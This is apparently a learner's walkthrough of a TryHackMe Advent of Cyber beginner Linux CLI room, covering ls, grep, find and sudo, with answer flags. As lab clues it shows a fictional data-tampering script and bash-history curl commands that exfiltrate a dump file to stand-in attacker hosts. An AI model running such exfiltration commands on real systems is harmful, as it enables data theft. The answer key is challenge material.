<h3 align="center">Advent of Cyber 2025 &nbsp;&nbsp; ·  &nbsp;&nbsp; Day 1 &nbsp;&nbsp; ·  &nbsp;&nbsp; Linux CLI - Shells Bells</h3>
<p align="center">2025, December 6  &nbsp; ·  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Explore the Linux command-line interface and use it to unveil Christmas mysteries. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti">here</a>.<br><img width="80px" src="https://github.com/user-attachments/assets/05e6f33e-e4c5-486c-8444-01627ed6b8c2"<br><br><img width="1200px" src="https://github.com/user-attachments/assets/1fefe588-c16e-4b92-a159-a811e5274882"></p>

<h2>Task 1 &nbsp; ·  &nbsp; Introduction</h2>

<h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/09b60674-69ee-4f85-a6c1-88777d058990"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>The unthinkable has happened - McSkidy has been kidnapped. Without her, Wareville’s defenses are faltering, and Christmas itself hangs by a thread. But panic won’t save the season. A long road lies ahead to uncover what truly happened. The TBFC (The Best Festival Company) team already brainstorms what to do next, and their first lead points to the tbfc-web01, a Linux server processing Christmas wishlists. Somewhere within its data may lie the truth: traces of McSkidy’s final actions, or perhaps the clues to King Malhare’s twisted vision for EASTMAS.</p>

<h6 align="center"><img width="250px" src="https://github.com/user-attachments/assets/f6cc997f-ffe2-48da-8091-c892be6677e8"><br>This image and all the theoretical content of<br>the present article is TryHackMe´s property.</h6>

<h3>Learning Objectives</h3>
<p>

- Learn the basics of the Linux command-line interface (CLI)<br>
- Explore its use for personal objectives and IT administration<br>
- Apply your knowledge to unveil the Christmas mysteries</p>

<h3>Connecting to the Machine</h3>
<p>Before moving forward, review the questions in the connection card shown below:</p>

<h6 align="center"><img width="300px" src="https://github.com/user-attachments/assets/7b110c92-717b-44f4-a7ab-79c03a305a8a"><br>This image and all the theoretical content of<br>the present article is TryHackMe´s property.</h6>

<p>Start the lab by clicking the <strong>Start Machine</strong> button below. The machine will start in split view and will take about two minutes to load. In case the machine is not visible, click the <strong>Show Split View</strong> button at the top of the page. Once the machine is loaded, you will have a terminal window - that's your Linux CLI, you'll need to type the commands there!</p>

<h3>Set up your virtual environment</h3>
<p>To successfully complete this room, you'll need to set up your virtual environment. This involves starting the Target Machine, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.</p>

<p>Alternatively, you can use the credentials below to connect to the target machine via SSH from your own THM VPN connected machine:

<h3>Credentials</h3>
<p>Only needed if you are using your own THM VPN connected machine.<br>Username: ...  &nbsp;&nbsp; Password: ... &nbsp;&nbsp; IP address: ... &nbsp;&nbsp; Connection via SSH: </p>

<p><em>Answer the question below</em></p>

<p>1.1. &nbsp;&nbsp; <em>I have successfully started my virtual machine!</em><br>
<code>No answer needed</code><p>


<h2>Task 2 &nbsp; ·  &nbsp; Linux CLI</h2>
<h3>Working With the Linux CLI</h3>
<p>- <em>But, there is no graphical interface (GUI) on the server! How will we look for clues?</em><br>
- <em>Who needs a GUI when we have a Linux command-line terminal? It’s even better!</em><br>

Linux has a powerful command-line interface, allowing you to use and manage the system simply by typing commands on your keyboard. It’s not as hard as it sounds - once you get used to it, maybe you’ll like the CLI more than the graphical interface. Not only that, but most experienced IT and cyber security experts work with the CLI every day, so let's start learning!<br>

- To run your first CLI command, type <code>echo "Hello World!"</code> and press Enter. This will "echo" the text back.<br>
- Then type <code>ls</code> to list the contents of the current directory. This command will show you McSkidy's files.<br>
- After that, type <code>cat README.txt</code> to display the file contents. You will see its content in the output below.</p>

<p align="center">Basic CLI Commands</p>

```bash
mcskidy@tbfc-web01:~$ echo "Hello World!"
Hello World!
mcskidy@tbfc-web01:~$ ls
Desktop Downloads [...] Guides README.txt
mcskidy@tbfc-web01:~$ cat README.txt
For all TBFC members,
Yesterday I spotted yet another Eggsploit on our servers.
Not sure what it means yet, but Wareville is in danger.
To be prepared, I'll write the security guide by tomorrow.
As a precaution, I'll also hide the guide from plain view.
~ McSkidy
```

<br>
<h4>Navigating to the Filesystem</h4>
<p>Looks like McSkidy left a security guide before being kidnapped - it would definitely help! You might have noticed the "Guides" directory when you ran <code>ls</code> last time - that's likely the directory we need. Your CLI journey began at McSkidy's home directory (you can verify this by running <code>pwd</code>), but now let's switch to the guides directory.<br>

- Switch the directory by running cd Guides. You will appear at <code>/home/mcskidy/Guides</code>.<br>
- Run the <code>ls</code> command again to list the content of the guides directory (it will be empty).</p>

<p align="center">Navigating With CD</p>

```bash
mcskidy@tbfc-web01:~$ cd Guides
mcskidy@tbfc-web01:~/Guides$ ls
```

<br>
<h4>Looking for the Hidden Guide</h4>
<p>Oh-oh, it looks like the guides aren't there. Or are they? In Linux, files and directories can be hidden from plain view if they start with a dot symbol (e.g., .secret.txt). Such a feature is often used by IT administrators to hide system files, by attackers to hide malware, and now by McSkidy to hide the precious guide from bad bunnies!<br>

- View the directory again by running <code>ls -la</code>. The <code>-a</code> flag shows the hidden files. The <code>-l</code> flag shows the additional details, such as file permissions and file owner.
- Read the hidden guide by running <code>cat .guides.txt</code>. Don't forget the leading dot.</p>

<p align="center">Reading Hidden Files</p>

```bash
mcskidy@tbfc-web01:~$ cd Guides
mcskidy@tbfc-web01:~/Guides$ ls
```

<br>
<h4>Grepping the Logs</h4>
<p>In her guide, McSkidy refers to <code>/var/log/</code>, a Linux directory where all security events (logs) are stored. Indeed, every SOC analyst at TBFC will confirm that the best way to find evil bunnies is to check the logs. Log files are usually very big, and looking through them with cat is not ideal. Thus, let's use <code>grep</code>, a command to look for a specific text inside a file.

- Navigate to the logs directory with cd <code>/var/log</code> and explore its content with <code>ls</code>.<br>
- Run <code>grep "Failed password" auth.log</code> to look for the failed logins inside the <code>auth.log</code>.</p>

<p align="center">Grepping Logfiles</p>

```bash
mcskidy@tbfc-web01:~$ cd /var/log
mcskidy@tbfc-web01:~$ grep "Failed password" auth.log
2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
[...]
```

<h6 align="center"><img width="300px" src="https://github.com/user-attachments/assets/35145060-b15c-4184-8db4-0866060bbd98"><br>This image and all the theoretical content of<br>the present article is TryHackMe´s property.</h6>

<br>
<h4>Finding the Files</h4>
<p>You can see a lot of failed logins on the "socmas" account, all from the HopSec location! They were clearly trying to break into SOC-mas, Wareville's Christmas ordering platform. What if bad bunnies left some malware there? Let's follow McSkidy's guide and look for Eggsploits and Eggshells with <code>find</code> - a command that searches for files with specific parameters, such as <code>-name</code>:<br>

- Run <code>find /home/socmas -name *egg*</code> to search for "eggs" in the socmas home directory.
- Note that <code>find</code> is a powerful command. Check out its documentation for more details.</p>

<p align="center">Using Find Command</p>

```bash
mcskidy@tbfc-web01:~$ find /home/socmas -name *egg*
/home/socmas/2025/eggstrike.sh
```

<br>
<h4>Analyzing the Eggstrike</h4>
<p>Looks like you found something, <code>eggstrike.sh</code>! Files with the <code>.sh</code> extension contain CLI commands and are called shell scripts. Such scripts are used both by IT teams to automate things and by attackers to quickly run malicious commands. Let's display the suspicious script's content and try to understand it:</p>

<p align="center">Eggstrike Content</p>

```bash
mcskidy@tbfc-web01:~$ cd /home/socmas/2025
mcskidy@tbfc-web01:~$ cat eggstrike.sh
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

<ol type="1. ">
  <li>The lines starting with <code>#</code> are just comments and are not the actual commands.</li>
  <li>The <code>cat wishlist.txt | sort | uniq</code> lists unique items from the wishlist.txt.</li>
  <li>The command then sends the output (unique orders) to the <code>/tmp/dump.txt</code> file.</li>
  <li>The <code>rm wishlist.txt</code> deletes the wishlist file (containing Christmas wishes).</li>
  <li>The <code>mv eastmas.txt wishlist.txt</code> replaces the original file with eastmas.txt.</li>
</ol></p>

<br>
<h4>CLI Features</h4>
<p>The Eggstrike script you read seems to be stealing Christmas wishes and replacing them with the fake ones! You might have noticed that the commands in the script are a bit complex, but that's not unusual since the script author is no other than Sir Carrotbane, the leader of HopSec's red team. Let's explore the special symbols below:</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/727493bd-7043-4dff-80b9-6f2a42b71427"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<br>
<h3>Sir Carrotbane Attacks</h3>

<h6 align="center"><img width="400px" src="https://github.com/user-attachments/assets/e5e8c64d-7cae-4c6d-acc7-974aaf748863"><br>This image and all the theoretical content of<br>the present article is TryHackMe´s property.</h6>

<p>Now it is clear that the server has been breached, and the Christmas wishlist has been replaced with an EASTMAS one. Although you found no clue of what happened to McSkidy, at least you know the attackers were there. You can see how Sir Carrotbane replaced the wishlist by visiting <code>http://MACHINE_IP:8000</code> from the VM's web browser. You can open it by clicking the Firefox icon on the Desktop.</p>

<br>
<h4>System Utilities</h4>
<p>There are hundreds of CLI commands to view and manage your system. For example, <code>uptime</code> to see how much time your system is running, <code>ip addr</code> to check your IP address, and <code>ps aux</code> to list all processes. You may also check the usernames and hashed passwords of users, such as McSkidy, by running <code>cat /etc/shadow</code>. However, you'd need root permissions to do that.</p>

<p align="center">Permission Denied</p>

```bash
mcskidy@tbfc-web01:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```

<br>
<h4>Root User</h4>
<p>Root is the default, ultimate Linux user who can do anything on the system. You can switch the user to root with <code>sudo su</code>, and return back to McSkidy with the <code>exit</code> command. Only root can open <code>/etc/shadow</code> and edit system settings, so this user is often a main target for attackers. If at any moment you want to verify your current user, just run <code>whoami</code>!<br>

- Switch to the root user by running the <code>sudo su</code> command.<br>
- You can verify your current user by running <code>whoami</code>.</p>

<p align="center">Switching yo the Root User</p>

```bash
mcskidy@tbfc-web01:~$ sudo su
root@tbfc-web01:/home/mcskidy$ whoami
root
```

<br>
<h4>Bash History</h4><br>
<p>Did you know that every command you run is saved in a hidden history file, also called Bash history? It is located at every user's home directory: <code>/home/mcskidy/.bash_history</code> for McSkidy, and <code>/root/.bash_history</code> for root, and you can check it with a convenient <code>history</code> command, or just read the files directly with <code>cat</code>. Let's check if Sir Carrotbane with his bad bunnies left their traces in history!

- Familiarize yourself with Bash history by running the <code>history</code> command.<br>
- Note that your commands are also saved to a file (<code>cat .bash_history</code>).</p>

<p align="center">Accessing Bash History</p>

```bash
root@tbfc-web01:/home/mcskidy$ cd /root
root@tbfc-web01:~$ cat .bash_history
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
[...]
```

<br>
<br>
<p>Objectives</p>

<br>
<p>2.1. &nbsp;&nbsp;<em>Which CLI command would you use to list a directory?</em><br>
<code>ls</code><p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/a7ed7f6c-624f-4f7a-b246-a739aa1859b4"></h6>

<br>
<p>2.2. &nbsp;&nbsp;<strong>Complete on machine</strong><br>
Identify the flag inside of the McSkidy's guide<br>
<code>THM{learning-linux-cli}</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/83aa4a03-8263-40b0-9d2a-d0c9e319b00a"></h6>

<br>
<p>2.3. &nbsp;&nbsp;<em>Which command helped you filter the logs for failed logins?</em><br>
<code>grep</code><p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/88c4e6be-e500-474a-b085-f162d59e3299"></h6>

<br>
<p>2.4. &nbsp;&nbsp;<strong>Complete on machine</strong><br>
Identify the flag inside the Eggstrike script<br>
<code>THM{sir-carrotbane-attacks}</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/067f9b84-6cb1-4611-be88-61852ba78848"></h6>

<br>
<p>2.5. &nbsp;&nbsp;<em>Which command would you run to switch to the root user?</em><br>
<code>sudo su</code><p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/74d483f7-4c4c-49bc-9394-282ab18ada35"></h6>

<br>
<p>2.6. &nbsp;&nbsp;<em>Finally, what flag did Sir Carrotbane leave in the root bash history?</em><br>
<code>THM{until-we-meet-again}</code><p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/292bed60-20bb-42c9-9684-741d05da6cdf"></h6>

<br>
<p>2.7. &nbsp;&nbsp;<em>For those who consider themselves intermediate and want another challenge, check McSkidy's hidden note in <code>/home/mcskidy/Documents/</code> to get access to the key for <strong>Side Quest 1</strong>! Accessible through our <a href="https://tryhackme.com/adventofcyber25/sidequest">Side Quest Hub</a>!</em><br>
<code>No answer needed</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/8114bac2-f54f-4c7e-a476-949dba548ca6"></h6>

<br>
<p>2.8. &nbsp;&nbsp;<em>Enjoyed investigating in a Linux environment? Check out our <a href="https://tryhackme.com/room/linuxlogsinvestigations">Linux Logs Investigations</a> room for more like this!</em><br>
<code>No answer needed</code></p>

<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/7b5249e9-ea65-4aed-aa98-896f877eb1d4"><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/fcd25ef8-f8df-4789-be5b-9af769748a32"><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/20badddf-c819-4530-b82e-d31a2060f6b2"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, December</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|6       |Easy 🔗 - Linux CLI - Shells Bells    |   1    |      97ᵗʰ    |     3ʳᵈ    |   55,824ᵗʰ   |      712ⁿᵈ     |    134,354  |    1,027    |    81     |

</h6></div><br>

<p align="center">Global All Time:     97ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/a35189a6-95d9-4b51-a735-5b090828576a"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/41d7b309-281c-493d-a050-a27a0700c693"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/8c8d0133-175e-47fd-a99e-ce94459d247c"><br><br>
                  Global monthly:  55,824ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c795574c-c22e-4cce-916f-abf25749b22e"><br><br>
                  Brazil monthly:     712ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/640cc2af-03af-4d72-95f8-acd0dcce046b"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
